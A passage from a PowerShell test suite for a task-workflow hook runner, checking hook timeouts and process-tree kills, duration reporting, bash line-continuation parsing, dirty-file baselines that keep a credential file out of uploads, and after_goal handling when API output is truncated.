    Write-Host "  FAIL: 11c: expected kill near 1s, took $([int]$srvWall)s" -ForegroundColor Red
    $script:FAIL++
}

# 11d: The budget spans the whole section — a later command only gets what
# the earlier commands left over.
$spanProj = Join-Path $TmpDir 'g11-span'
New-Item -ItemType Directory -Path $spanProj -Force | Out-Null
Set-Content -Path (Join-Path $spanProj '.stride.md') -Value @'
## before_doing
```bash
sleep 2
sleep 30
```
'@ -Encoding UTF8
$env:STRIDE_HOOK_TIMEOUT_OVERRIDE = "$($script:SpanTestBudget)"
try {
    $spanStart = [DateTimeOffset]::UtcNow
    $r = Invoke-HookScript -InputJson $claimJson11 -Phase 'post' -ProjectDir $spanProj
    $spanWall = ([DateTimeOffset]::UtcNow - $spanStart).TotalSeconds
} finally {
    Remove-Item Env:STRIDE_HOOK_TIMEOUT_OVERRIDE -ErrorAction SilentlyContinue
}
Assert-Exit "11d: section-budget overrun exits 2" 2 $r.ExitCode
Assert-Contains "11d: the SECOND command is the one killed" '"command_index":1' $r.Stdout
Assert-Contains "11d: failure JSON marks timed_out" '"timed_out":true' $r.Stdout
Assert-Contains "11d: budget reported is the section budget" "`"budget_seconds`":$($script:SpanTestBudget)" $r.Stdout
if ($spanWall -lt (Get-WallBudget -Base 15 -UnkilledSec 32)) {
    Write-Host "  PASS: 11d: section killed near its 4s budget ($([int]$spanWall)s wall clock)" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 11d: expected kill near 4s, took $([int]$spanWall)s" -ForegroundColor Red
    $script:FAIL++
}

# 11e: Kill($true) terminates the whole process tree — a child spawned by the
# hung command must not survive the kill.
$orphanProj = Join-Path $TmpDir 'g11-orphan'
New-Item -ItemType Directory -Path $orphanProj -Force | Out-Null
Set-Content -Path (Join-Path $orphanProj '.stride.md') -Value @'
## before_doing
```bash
sleep 30 & echo $! > orphan.pid; wait
```
'@ -Encoding UTF8
$env:STRIDE_HOOK_TIMEOUT_OVERRIDE = "$($script:TimeoutTestBudget)"
try {
    $r = Invoke-HookScript -InputJson $claimJson11 -Phase 'post' -ProjectDir $orphanProj
} finally {
    Remove-Item Env:STRIDE_HOOK_TIMEOUT_OVERRIDE -ErrorAction SilentlyContinue
}
Assert-Exit "11e: orphan fixture times out (exit 2)" 2 $r.ExitCode
$orphanPidFile = Join-Path $orphanProj 'orphan.pid'
if (-not (Test-Path $orphanPidFile)) {
    Write-Host "  FAIL: 11e: fixture never wrote orphan.pid" -ForegroundColor Red
    $script:FAIL++
} else {
    $orphanPid = (Get-Content $orphanPidFile -Raw).Trim()
    $orphanDead = $false
    foreach ($attempt in 1..6) {
        $alive = $null
        try { $alive = Get-Process -Id ([int]$orphanPid) -ErrorAction Stop } catch { $alive = $null }
        if ($null -eq $alive) { $orphanDead = $true; break }
        Start-Sleep -Seconds 1
    }
    if ($orphanDead) {
        Write-Host "  PASS: 11e: process tree killed — no orphaned child" -ForegroundColor Green
        $script:PASS++
    } else {
        Write-Host "  FAIL: 11e: orphan $orphanPid survived the kill" -ForegroundColor Red
        $script:FAIL++
        try { Stop-Process -Id ([int]$orphanPid) -Force -ErrorAction SilentlyContinue } catch { }
    }
}

# ============================================================
# Test Group 12: duration_ms reporting (W1455)
# ============================================================
Write-Host ""
Write-Host "=== Test Group 12: duration_ms reporting (W1455) ==="

# 12a: A hook sleeping ~1s reports duration_ms of plausible magnitude,
# alongside the deprecated duration_seconds.
$durProj = Join-Path $TmpDir 'g12-duration'
New-Item -ItemType Directory -Path $durProj -Force | Out-Null
Set-Content -Path (Join-Path $durProj '.stride.md') -Value @'
## before_doing
```bash
sleep 1
```
'@ -Encoding UTF8
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X POST https://stridelikeaboss.com/api/tasks/claim -d {}"}}' -Phase 'post' -ProjectDir $durProj
Assert-Exit "12a: sleeping hook exits 0" 0 $r.ExitCode
Assert-Contains "12a: success JSON still carries deprecated duration_seconds" '"duration_seconds"' $r.Stdout
$durMatch = [regex]::Match($r.Stdout, '"duration_ms":(\d+)')
if ($durMatch.Success -and [long]$durMatch.Groups[1].Value -ge 900 -and [long]$durMatch.Groups[1].Value -le 5000) {
    Write-Host "  PASS: 12a: duration_ms is a plausible integer ($($durMatch.Groups[1].Value)ms for a 1s sleep)" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 12a: expected duration_ms in 900..5000, got: '$($durMatch.Groups[1].Value)'" -ForegroundColor Red
    $script:FAIL++
}

# 12b: A sub-second hook body reports a small non-negative duration_ms.
$fastProj = Join-Path $TmpDir 'g12-fast'
New-Item -ItemType Directory -Path $fastProj -Force | Out-Null
Set-Content -Path (Join-Path $fastProj '.stride.md') -Value @'
## before_doing
```bash
echo "instant"
```
'@ -Encoding UTF8
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X POST https://stridelikeaboss.com/api/tasks/claim -d {}"}}' -Phase 'post' -ProjectDir $fastProj
Assert-Exit "12b: instant hook exits 0" 0 $r.ExitCode
$durMatch = [regex]::Match($r.Stdout, '"duration_ms":(\d+)')
if ($durMatch.Success -and [long]$durMatch.Groups[1].Value -ge 0 -and [long]$durMatch.Groups[1].Value -le 5000) {
    Write-Host "  PASS: 12b: sub-second hook reports non-negative duration_ms ($($durMatch.Groups[1].Value)ms)" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 12b: expected non-negative duration_ms, got: '$($durMatch.Groups[1].Value)'" -ForegroundColor Red
    $script:FAIL++
}

# ============================================================
# Test Group 13: backslash line continuation (W1456)
# ============================================================
Write-Host ""
Write-Host "=== Test Group 13: backslash line continuation (W1456) ==="

$contClaimJson = '{"tool_input":{"command":"curl -X POST https://stridelikeaboss.com/api/tasks/claim -d {}"}}'

# 13a: The canonical multi-line gh pr create example parses into ONE command.
$ghBin = Join-Path $TmpDir 'g13-fake-bin'
New-Item -ItemType Directory -Path $ghBin -Force | Out-Null
Set-Content -Path (Join-Path $ghBin 'gh') -Value @'
#!/bin/sh
echo "gh-argc:$#"
'@ -Encoding UTF8
bash -c "chmod +x '$ghBin/gh'"
$contProj = Join-Path $TmpDir 'g13-continuation'
New-Item -ItemType Directory -Path $contProj -Force | Out-Null
Set-Content -Path (Join-Path $contProj '.stride.md') -Value @'
## before_doing
```bash
gh pr create \
  --title "$TASK_IDENTIFIER: $TASK_TITLE" \
  --body "Implements $TASK_IDENTIFIER."
```
'@ -Encoding UTF8
$savedPath = $env:PATH
$env:PATH = "${ghBin}:$($env:PATH)"
try {
    $r = Invoke-HookScript -InputJson $contClaimJson -Phase 'post' -ProjectDir $contProj
} finally {
    $env:PATH = $savedPath
}
Assert-Exit "13a: docs gh example exits 0" 0 $r.ExitCode
Assert-Contains "13a: gh received all six arguments in one invocation" "gh-argc:6" $r.Stdout
$contParsed = $null
try { $contParsed = $r.Stdout | ConvertFrom-Json } catch { $contParsed = $null }
if ($contParsed -and @($contParsed.commands_completed).Count -eq 1) {
    Write-Host "  PASS: 13a: the three physical lines joined into ONE command" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 13a: expected 1 completed command, got: $(if ($contParsed) { @($contParsed.commands_completed).Count } else { 'unparseable' })" -ForegroundColor Red
    $script:FAIL++
}

# 13b: Trailing backslash on the section's last line still runs the command.
$tailProj = Join-Path $TmpDir 'g13-tail'
New-Item -ItemType Directory -Path $tailProj -Force | Out-Null
Set-Content -Path (Join-Path $tailProj '.stride.md') -Value @'
## before_doing
```bash
echo tail\
```
'@ -Encoding UTF8
$r = Invoke-HookScript -InputJson $contClaimJson -Phase 'post' -ProjectDir $tailProj
Assert-Exit "13b: trailing backslash at section end exits 0" 0 $r.ExitCode
Assert-Contains "13b: the command still ran" "tail" $r.Stdout

# 13c: Escaped and quoted backslashes do not trigger joining.
$quoteProj = Join-Path $TmpDir 'g13-quoted'
New-Item -ItemType Directory -Path $quoteProj -Force | Out-Null
Set-Content -Path (Join-Path $quoteProj '.stride.md') -Value @'
## before_doing
```bash
echo x\\
echo second
echo 'lit \'
echo third
```
'@ -Encoding UTF8
$r = Invoke-HookScript -InputJson $contClaimJson -Phase 'post' -ProjectDir $quoteProj
Assert-Exit "13c: escaped/quoted backslash fixture exits 0" 0 $r.ExitCode
$contParsed = $null
try { $contParsed = $r.Stdout | ConvertFrom-Json } catch { $contParsed = $null }
if ($contParsed -and @($contParsed.commands_completed).Count -eq 4) {
    Write-Host "  PASS: 13c: four physical lines stay four separate commands" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 13c: expected 4 completed commands, got: $(if ($contParsed) { @($contParsed.commands_completed).Count } else { 'unparseable' })" -ForegroundColor Red
    $script:FAIL++
}
Assert-Contains "13c: quoted-literal-backslash command ran separately" "third" $r.Stdout

# 13d: Continuation across three physical lines joins into one command.
$tripleProj = Join-Path $TmpDir 'g13-triple'
New-Item -ItemType Directory -Path $tripleProj -Force | Out-Null
Set-Content -Path (Join-Path $tripleProj '.stride.md') -Value @'
## before_doing
```bash
echo a \
b \
c
```
'@ -Encoding UTF8
$r = Invoke-HookScript -InputJson $contClaimJson -Phase 'post' -ProjectDir $tripleProj
Assert-Exit "13d: three-line continuation exits 0" 0 $r.ExitCode
Assert-Contains "13d: joined command output intact" "a b c" $r.Stdout

# 13e: A standalone comment line ending in a backslash is inert — the
# following command must still run (comments never continue in shell).
$commentBsProj = Join-Path $TmpDir 'g13-comment-backslash'
New-Item -ItemType Directory -Path $commentBsProj -Force | Out-Null
Set-Content -Path (Join-Path $commentBsProj '.stride.md') -Value @'
## before_doing
```bash
# reminder about C:\temp\
echo survives
```
'@ -Encoding UTF8
$r = Invoke-HookScript -InputJson $contClaimJson -Phase 'post' -ProjectDir $commentBsProj
Assert-Exit "13e: comment ending in backslash exits 0" 0 $r.ExitCode
Assert-Contains "13e: the command after the comment still runs" "survives" $r.Stdout

# 13f: DECIDED behavior parity — a backslash at end of line inside an
# unclosed single quote is literal (no join) and fails loudly.
$unclosedProj = Join-Path $TmpDir 'g13-unclosed-quote'
New-Item -ItemType Directory -Path $unclosedProj -Force | Out-Null
Set-Content -Path (Join-Path $unclosedProj '.stride.md') -Value @'
## before_doing
```bash
echo 'one \
two'
```
'@ -Encoding UTF8
$r = Invoke-HookScript -InputJson $contClaimJson -Phase 'post' -ProjectDir $unclosedProj
Assert-Exit "13f: backslash inside unclosed single quote does not join (fails loudly)" 2 $r.ExitCode

# ============================================================
# Test Group 14: claim-time dirty baseline (W1457)
# ============================================================
Write-Host ""
Write-Host "=== Test Group 14: claim-time dirty baseline (W1457) ==="

# 14a: A claim through the hook script writes the dirty baseline.
$blProj = New-GitRepo -Name 'g14-baseline'
Set-Content -Path (Join-Path $blProj 'dirty.txt') -Value 'committed' -Encoding UTF8
& git -C $blProj add . 2>$null | Out-Null
& git -C $blProj commit -q -m 'add dirty.txt' 2>$null | Out-Null
Add-Content -Path (Join-Path $blProj 'dirty.txt') -Value 'edited before claim' -Encoding UTF8
$blClaim = @{
    tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
    tool_response = @{ stdout = '{"data":{"id":99,"identifier":"W99","title":"T","status":"in_progress","complexity":"small","priority":"low"}}'; stderr = ''; interrupted = $false }
} | ConvertTo-Json -Compress
$r = Invoke-HookScript -InputJson $blClaim -Phase 'post' -ProjectDir $blProj
Assert-Exit "14a: claim with dirty tree exits 0" 0 $r.ExitCode
$blContent = Get-Content -Raw -Path (Join-Path $blProj '.stride-dirty-baseline') -ErrorAction SilentlyContinue
Assert-Contains "14a: claim wrote the dirty baseline" "dirty.txt" $blContent

# 14b: The CAPTURE filter drops claim-dirty unchanged entries and the two
# dot-files, keeps task work and re-modified entries. (W2100: this said "upload
# filter" and tested one, until the hook began building its own snapshot — the
# same header correction 7e got. Upload-side filtering is covered by 7e2.)
$blUpProj = New-GitRepo -Name 'g14-upload'
Set-Content -Path (Join-Path $blUpProj 'pre.txt') -Value 'one' -Encoding UTF8
Set-Content -Path (Join-Path $blUpProj 'remod.txt') -Value 'two' -Encoding UTF8
& git -C $blUpProj add . 2>$null | Out-Null
& git -C $blUpProj commit -q -m 'seed' 2>$null | Out-Null
Add-Content -Path (Join-Path $blUpProj 'pre.txt') -Value 'dirty at claim' -Encoding UTF8
Add-Content -Path (Join-Path $blUpProj 'remod.txt') -Value 'dirty at claim' -Encoding UTF8
$preHash = (& git -C $blUpProj hash-object -- 'pre.txt' | Out-String).Trim()
$remodHash = (& git -C $blUpProj hash-object -- 'remod.txt' | Out-String).Trim()
Set-Content -Path (Join-Path $blUpProj '.stride-dirty-baseline') -Value @(
    "$preHash pre.txt"
    "$remodHash remod.txt"
) -Encoding UTF8
# remod.txt is modified AGAIN after the baseline; pre.txt stays as-claimed.
Add-Content -Path (Join-Path $blUpProj 'remod.txt') -Value 'task edit' -Encoding UTF8
# (W2100) work.txt and .stride_auth.md used to exist only inside the pre-seeded
# snapshot, which was enough when ps1 merely uploaded that file. Now the hook
# BUILDS the snapshot, so they must be real: work.txt is the task work that has
# to survive, and .stride_auth.md — the credential file — has to be excluded by
# the capture itself rather than by a filter applied to someone else's list.
# It is deliberately NOT gitignored, so the exclusion is what removes it.
Set-Content -Path (Join-Path $blUpProj 'work.txt') -Value 'task work' -Encoding UTF8
Set-Content -Path (Join-Path $blUpProj '.stride_auth.md') -Value 'SECRET' -Encoding UTF8
Set-Content -Path (Join-Path $blUpProj '.stride.md') -Value @'
## after_doing
```bash
echo "ran"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $blUpProj '.stride-changed-files.json') `
    -Value '[{"path":"pre.txt","diff":"pre-existing"},{"path":"remod.txt","diff":"re-modified"},{"path":"work.txt","diff":"task work"},{"path":".stride_auth.md","diff":"SECRET"},{"path":".stride.md","diff":"hook file"}]' -Encoding UTF8
# Anchor the base at HEAD so the assertion stays about the BASELINE filter:
# with no committed range, tracked.txt (committed by New-GitRepo between HEAD~1
# and HEAD) stays out of the change set and the surviving entries are exactly
# the working-tree ones this case is about.
$blHead = (& git -C $blUpProj rev-parse HEAD | Out-String).Trim()
Set-Content -Path (Join-Path $blUpProj '.stride-env-cache') `
    -Value "TASK_ID=99`nTASK_BASE_REF=$blHead" -Encoding UTF8

$blPort = 18877
$blFixture = Join-Path $TmpDir 'baseline-put-fixture.json'
if (Test-Path $blFixture) { Remove-Item -Force $blFixture }

$blListenerJob = Start-Job -ArgumentList $blPort, $blFixture -ScriptBlock {
    param($Port, $Fixture)
    $l = [System.Net.HttpListener]::new()
    $l.Prefixes.Add("http://localhost:$Port/")
    try {
        $l.Start()
        $ctx = $l.GetContext()
        $req = $ctx.Request
        $reader = [System.IO.StreamReader]::new($req.InputStream)
        $body = $reader.ReadToEnd()
        @{ Body = $body } | ConvertTo-Json -Compress | Set-Content -Path $Fixture -Encoding UTF8
        $resp = $ctx.Response
        $resp.StatusCode = 200
        $resp.OutputStream.Close()
    } catch {
        # Listener tear-down errors are ignored.
    } finally {
        if ($l.IsListening) { $l.Stop() }
    }
}

try {
    $null = Wait-ForListener -Port $blPort
    $blCmd = "curl -X PATCH http://localhost:$blPort/api/tasks/99/complete -H `"Authorization: Bearer test_token_bl`""
    $blJson = @{ tool_input = @{ command = $blCmd } } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $blJson -Phase 'pre' -ProjectDir $blUpProj
    Assert-Exit "14b: hook exits 0 after baseline-filtered PUT" 0 $r.ExitCode

    Wait-Job $blListenerJob -Timeout 8 | Out-Null
    Remove-Job $blListenerJob -Force -ErrorAction SilentlyContinue

    if (Test-Path $blFixture) {
        $record = Get-Content -Raw -Path $blFixture | ConvertFrom-Json
        $parsedBody = $record.Body | ConvertFrom-Json
        $decoded = [System.Convert]::FromBase64String($parsedBody.changed_files.data)
        $decodedText = [System.Text.Encoding]::UTF8.GetString($decoded)
        $entries = @($decodedText | ConvertFrom-Json)
        $paths = @($entries | ForEach-Object { $_.path })
        if ($paths -contains 'work.txt' -and $paths -contains 'remod.txt') {
            Write-Host "  PASS: 14b: task work and re-modified file survive the filter" -ForegroundColor Green
            $script:PASS++
        } else {
            Write-Host "  FAIL: 14b: expected work.txt + remod.txt, got: $($paths -join ', ')" -ForegroundColor Red
            $script:FAIL++
        }
        if ($paths -notcontains 'pre.txt') {
            Write-Host "  PASS: 14b: claim-dirty unchanged file stripped from PUT body" -ForegroundColor Green
            $script:PASS++
        } else {
            Write-Host "  FAIL: 14b: claim-dirty unchanged pre.txt leaked into PUT body" -ForegroundColor Red
            $script:FAIL++
        }
        if ($paths -notcontains '.stride_auth.md' -and $paths -notcontains '.stride.md') {
            Write-Host "  PASS: 14b: auth and hook dot-files never uploaded" -ForegroundColor Green
            $script:PASS++
        } else {
            Write-Host "  FAIL: 14b: dot-file leaked into PUT body: $($paths -join ', ')" -ForegroundColor Red
            $script:FAIL++
        }
    } else {
        Write-Host "  FAIL: 14b: baseline-filtered PUT did not arrive at listener" -ForegroundColor Red
        $script:FAIL++
    }
} finally {
    if ($blListenerJob -and $blListenerJob.State -eq 'Running') {
        Stop-Job $blListenerJob -ErrorAction SilentlyContinue
        Remove-Job $blListenerJob -Force -ErrorAction SilentlyContinue
    }
}

# ============================================================
# Test Group 15: canonical response file + D119 fresh call
# (mirrors test-stride-hook.sh D118/W1609 Group 9 + D119 Group 19)
# ============================================================
Write-Host ""
Write-Host "=== Test Group 15: canonical file + D119 fresh call ==="

# Listener that answers GET /api/tasks/:id/after_goal_status with a JSON body
# and logs the hit to a fixture file. $Armed toggles after_goal_armed.
function Start-AfterGoalStatusListener {
    param([int]$Port, [string]$Fixture, [bool]$Armed = $true)
    Start-Job -ArgumentList $Port, $Fixture, $Armed -ScriptBlock {
        param($Port, $Fixture, $Armed)
        $l = [System.Net.HttpListener]::new()
        $l.Prefixes.Add("http://localhost:$Port/")
        try {
            $l.Start()
            $ctx = $l.GetContext()
            $req = $ctx.Request
            @{ Method = $req.HttpMethod; Path = $req.Url.AbsolutePath } |
                ConvertTo-Json -Compress | Add-Content -Path $Fixture -Encoding UTF8
            if ($Armed) {
                $bodyStr = '{"after_goal_armed":true,"goal_id":55,"goal_identifier":"G7","env":{"GOAL_ID":"55","GOAL_IDENTIFIER":"G7","GOAL_TITLE":"Goal Seven","HOOK_NAME":"after_goal"}}'
            } else {
                $bodyStr = '{"after_goal_armed":false,"goal_id":null,"goal_identifier":null,"env":{}}'
            }
            $buf = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
            $ctx.Response.StatusCode = 200
            $ctx.Response.ContentType = 'application/json'
            $ctx.Response.OutputStream.Write($buf, 0, $buf.Length)
            $ctx.Response.OutputStream.Close()
        } catch {
            # Listener tear-down errors are ignored.
        } finally {
            if ($l.IsListening) { $l.Stop() }
        }
    }
}

# Project whose ## after_goal echoes GOAL_IDENTIFIER; env cache pre-seeds TASK_ID.
function New-D119Project {
    param([string]$Suffix)
    $dir = Join-Path $TmpDir "d119-$Suffix"
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    Set-Content -Path (Join-Path $dir '.stride.md') -Value @'
## after_goal
```bash
echo "after_goal_ran for $GOAL_IDENTIFIER"
```
'@ -Encoding UTF8
    Set-Content -Path (Join-Path $dir '.stride-env-cache') -Value 'TASK_ID=42' -Encoding UTF8
    return $dir
}

# 15a (D118): a truncated /complete stdout with a present canonical response file
# carrying after_goal -> the section runs from the file (fast path), no fresh call.
$d15aProj = New-D119Project -Suffix 'file-fastpath'
New-Item -ItemType Directory -Path (Join-Path $d15aProj '.stride') -Force | Out-Null
Set-Content -Path (Join-Path $d15aProj '.stride/.last-api-response.json') `
    -Value '{"data":{"id":42},"hooks":[{"name":"after_goal","env":{"GOAL_IDENTIFIER":"G9"}}]}' -Encoding UTF8 -NoNewline
$d15aInput = @{
    tool_input    = @{ command = 'curl -X PATCH https://stridelikeaboss.com/api/tasks/42/complete -H "Authorization: Bearer tok"' }
    tool_response = @{ stdout = '{"data":{"id":42},"hoo' }
} | ConvertTo-Json -Compress
$r = Invoke-HookScript -InputJson $d15aInput -Phase 'post' -ProjectDir $d15aProj
Assert-Exit "15a: truncated stdout + canonical file exits 0" 0 $r.ExitCode
Assert-Contains "15a: after_goal runs from the canonical file (G9)" "after_goal_ran for G9" $r.Stdout

# 15b (W1609): a claim with truncated stdout + present canonical file recovers
# the full task JSON from the file into the env cache (TASK_IDENTIFIER).
$d15bProj = Join-Path $TmpDir 'd119-claim-file'
New-Item -ItemType Directory -Path $d15bProj -Force | Out-Null
Set-Content -Path (Join-Path $d15bProj '.stride.md') -Value @'
## before_doing
```bash
echo "claimed"
```
'@ -Encoding UTF8
New-Item -ItemType Directory -Path (Join-Path $d15bProj '.stride') -Force | Out-Null
Set-Content -Path (Join-Path $d15bProj '.stride/.last-api-response.json') `
    -Value '{"data":{"id":609,"identifier":"W609","title":"File Task","status":"in_progress","complexity":"medium","priority":"high"}}' -Encoding UTF8 -NoNewline
$d15bInput = @{
    tool_input    = @{ command = 'curl -X POST https://stridelikeaboss.com/api/tasks/claim' }
    tool_response = @{ stdout = '{"data":{"id":609,"identif' }
} | ConvertTo-Json -Compress
$r = Invoke-HookScript -InputJson $d15bInput -Phase 'post' -ProjectDir $d15bProj
$d15bCache = ''
if (Test-Path (Join-Path $d15bProj '.stride-env-cache')) {
    $d15bCache = Get-Content (Join-Path $d15bProj '.stride-env-cache') -Raw -Encoding UTF8
}
Assert-Contains "15b: truncated claim recovers identifier from the canonical file" "TASK_IDENTIFIER='W609'" $d15bCache

# 15c (W1609): a valid claim stdout is captured to the canonical response file.
$d15cProj = Join-Path $TmpDir 'd119-capture'
New-Item -ItemType Directory -Path $d15cProj -Force | Out-Null
Set-Content -Path (Join-Path $d15cProj '.stride.md') -Value @'
## before_doing
```bash
echo "claimed"
```
'@ -Encoding UTF8
$d15cInput = @{
    tool_input    = @{ command = 'curl -X POST https://stridelikeaboss.com/api/tasks/claim' }
    tool_response = @{ stdout = '{"data":{"id":610,"identifier":"W610","title":"Cap","status":"in_progress","complexity":"small","priority":"low"}}' }
} | ConvertTo-Json -Compress
$r = Invoke-HookScript -InputJson $d15cInput -Phase 'post' -ProjectDir $d15cProj
$d15cFile = ''
if (Test-Path (Join-Path $d15cProj '.stride/.last-api-response.json')) {
    $d15cFile = Get-Content (Join-Path $d15cProj '.stride/.last-api-response.json') -Raw -Encoding UTF8
}
Assert-Contains "15c: valid claim stdout captured to the canonical file" '"identifier":"W610"' $d15cFile

# 15d (D119): truncated stdout + NO file + armed endpoint -> fresh call runs after_goal.
$d15dPort = 18901
$d15dFixture = Join-Path $TmpDir 'd119-armed-fixture.txt'
$d15dProj = New-D119Project -Suffix 'fresh-armed'
$d15dJob = Start-AfterGoalStatusListener -Port $d15dPort -Fixture $d15dFixture -Armed $true
try {
    $null = Wait-ForListener -Port $d15dPort
    $d15dInput = @{
        tool_input    = @{ command = "curl -X PATCH http://localhost:$d15dPort/api/tasks/42/complete -H `"Authorization: Bearer tok`"" }
        tool_response = @{ stdout = '{"data":{"id":42},"hoo' }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $d15dInput -Phase 'post' -ProjectDir $d15dProj
    Assert-Exit "15d: hook-initiated after_goal exits 0" 0 $r.ExitCode
    Assert-Contains "15d: fresh call ran after_goal with endpoint GOAL_IDENTIFIER" "after_goal_ran for G7" $r.Stdout
} finally {
    Wait-Job $d15dJob -Timeout 8 | Out-Null
    Remove-Job $d15dJob -Force -ErrorAction SilentlyContinue
}
$d15dHit = Get-Content -Raw -Path $d15dFixture -ErrorAction SilentlyContinue
Assert-Contains "15d: the after_goal_status endpoint was called" "after_goal_status" ([string]$d15dHit)

# 15e (D119): armed=false -> after_goal does NOT run.
$d15ePort = 18902
$d15eFixture = Join-Path $TmpDir 'd119-notarmed-fixture.txt'
$d15eProj = New-D119Project -Suffix 'fresh-notarmed'
$d15eJob = Start-AfterGoalStatusListener -Port $d15ePort -Fixture $d15eFixture -Armed $false
try {
    $null = Wait-ForListener -Port $d15ePort
    $d15eInput = @{
        tool_input    = @{ command = "curl -X PATCH http://localhost:$d15ePort/api/tasks/42/complete -H `"Authorization: Bearer tok`"" }
        tool_response = @{ stdout = '{"data":{"id":42},"hoo' }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $d15eInput -Phase 'post' -ProjectDir $d15eProj
    Assert-Exit "15e: armed=false exits 0" 0 $r.ExitCode
    Assert-NotContains "15e: armed=false does not run after_goal" "after_goal_ran" $r.Stdout
} finally {
    Wait-Job $d15eJob -Timeout 8 | Out-Null
    Remove-Job $d15eJob -Force -ErrorAction SilentlyContinue
}

# 15f (D119 de-dup): a present canonical file (fast path) runs the section once
# and the fresh endpoint is NOT called.
$d15fPort = 18903
$d15fFixture = Join-Path $TmpDir 'd119-dedup-fixture.txt'
$d15fProj = New-D119Project -Suffix 'dedup'
New-Item -ItemType Directory -Path (Join-Path $d15fProj '.stride') -Force | Out-Null
Set-Content -Path (Join-Path $d15fProj '.stride/.last-api-response.json') `
    -Value '{"data":{"id":42},"hooks":[{"name":"after_goal","env":{"GOAL_IDENTIFIER":"G9"}}]}' -Encoding UTF8 -NoNewline
$d15fJob = Start-AfterGoalStatusListener -Port $d15fPort -Fixture $d15fFixture -Armed $true
try {
    $null = Wait-ForListener -Port $d15fPort
    $d15fInput = @{
        tool_input    = @{ command = "curl -X PATCH http://localhost:$d15fPort/api/tasks/42/complete -H `"Authorization: Bearer tok`"" }
        tool_response = @{ stdout = '{"data":{"id":42},"hoo' }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $d15fInput -Phase 'post' -ProjectDir $d15fProj
    Assert-Contains "15f: fast path runs after_goal from the file (G9)" "after_goal_ran for G9" $r.Stdout
    $d15fRuns = ([regex]::Matches($r.Stdout, 'ran for G9')).Count
    Assert-Eq "15f: after_goal ran exactly once (de-dup)" 1 $d15fRuns
} finally {
    Stop-Job $d15fJob -ErrorAction SilentlyContinue
    Remove-Job $d15fJob -Force -ErrorAction SilentlyContinue
}
$d15fHit = Get-Content -Raw -Path $d15fFixture -ErrorAction SilentlyContinue
Assert-NotContains "15f: fast path short-circuits the fresh call (endpoint not hit)" "after_goal_status" ([string]$d15fHit)

# 15g (D119): unreachable endpoint -> clean no-op, exit 0, section not run.
$d15gProj = New-D119Project -Suffix 'unreachable'
$d15gInput = @{
    tool_input    = @{ command = 'curl -X PATCH http://localhost:18904/api/tasks/42/complete -H "Authorization: Bearer tok"' }
    tool_response = @{ stdout = '{"data":{"id":42},"hoo' }
} | ConvertTo-Json -Compress
$r = Invoke-HookScript -InputJson $d15gInput -Phase 'post' -ProjectDir $d15gProj
Assert-Exit "15g: unreachable endpoint still exits 0" 0 $r.ExitCode
Assert-NotContains "15g: unreachable endpoint does not run after_goal" "after_goal_ran" $r.Stdout

# ============================================================
# Test Group 16: after_goal reliability under truncation (W1612)
# ============================================================
# PowerShell parity of test-stride-hook.sh Group 20: under a truncated
# tool_response.stdout, prove after_goal is detected, GOAL_* is exported, and
# ## after_goal runs via the canonical response file — plus the parent_id
# fallback and missing-section edge cases, and a no-file no-false-positive
# control. (The fresh-call path itself is covered by Group 15.)
Write-Host ""
Write-Host "=== Test Group 16: after_goal reliability under truncation (W1612) ==="

# A /complete input whose stdout is truncated mid-JSON, so detection MUST come
# from the canonical response file.
$w16Trunc = @{
    tool_input    = @{ command = 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete' }
    tool_response = @{ stdout = '{"data":{"id":99},"hoo' }
} | ConvertTo-Json -Compress

# 16a: truncated stdout + present canonical file with a full after_goal entry ->
# section runs, GOAL_* reaches the section AND the env cache (reliability proof).
$w16aProj = Join-Path $TmpDir 'w1612-fastpath'
New-Item -ItemType Directory -Path (Join-Path $w16aProj '.stride') -Force | Out-Null
Set-Content -Path (Join-Path $w16aProj '.stride.md') -Value @'
## after_goal
```bash
echo "goal=[$GOAL_ID] ident=[$GOAL_IDENTIFIER] title=[$GOAL_TITLE]"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $w16aProj '.stride/.last-api-response.json') `
    -Value '{"data":{"id":99,"parent_id":55},"hooks":[{"name":"before_review"},{"name":"after_goal","env":{"GOAL_ID":"55","GOAL_IDENTIFIER":"G55","GOAL_TITLE":"Goal 55"}}]}' -Encoding UTF8 -NoNewline
$r = Invoke-HookScript -InputJson $w16Trunc -Phase 'post' -ProjectDir $w16aProj
Assert-Exit "16a: truncated /complete with a present file exits 0" 0 $r.ExitCode
Assert-Contains "16a: ## after_goal ran with GOAL_IDENTIFIER from the file" "ident=[G55]" $r.Stdout
Assert-Contains "16a: GOAL_TITLE exported to the section" "title=[Goal 55]" $r.Stdout
$w16aCache = ''
if (Test-Path (Join-Path $w16aProj '.stride-env-cache')) {
    $w16aCache = Get-Content (Join-Path $w16aProj '.stride-env-cache') -Raw -Encoding UTF8
}
Assert-Contains "16a: env cache carries GOAL_ID for the follow-up PATCH" "GOAL_ID='55'" $w16aCache

# 16b: truncated stdout + present file whose after_goal env OMITS GOAL_ID but
# data.parent_id is set -> parent-id fallback exports GOAL_ID under truncation.
$w16bProj = Join-Path $TmpDir 'w1612-parentid'
New-Item -ItemType Directory -Path (Join-Path $w16bProj '.stride') -Force | Out-Null
Set-Content -Path (Join-Path $w16bProj '.stride.md') -Value @'
## after_goal
```bash
echo "goal=[$GOAL_ID] ident=[$GOAL_IDENTIFIER]"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $w16bProj '.stride/.last-api-response.json') `
    -Value '{"data":{"id":99,"parent_id":77},"hooks":[{"name":"after_goal","env":{"GOAL_IDENTIFIER":"G77"}}]}' -Encoding UTF8 -NoNewline
